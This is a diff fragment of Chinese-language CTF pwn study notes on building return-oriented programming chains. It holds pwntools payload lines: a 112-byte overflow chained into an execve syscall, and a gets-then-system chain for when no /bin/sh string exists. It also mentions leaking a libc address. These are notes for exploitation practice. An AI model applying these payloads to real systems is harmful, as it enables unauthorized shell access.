@@ -27,7 +27,7 @@ pwn需要system和/bin/sh（构造rop链，注意函数参数和返回值）
 payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])遇到软中断，逆流调用
 
 如果没有/bin/sh
-payload = flat(['a' * 112, gets_plt, pop_ebx（任意寄存器）, buf2, system_plt, 'aaaa', buf2])
+payload = flat(['a' * 112, gets_plt, pop_ebx（存入任意寄存器？）, buf2, system_plt, 'aaaa', buf2])
 
 如果都没有
     泄露 __libc_start_main 地址
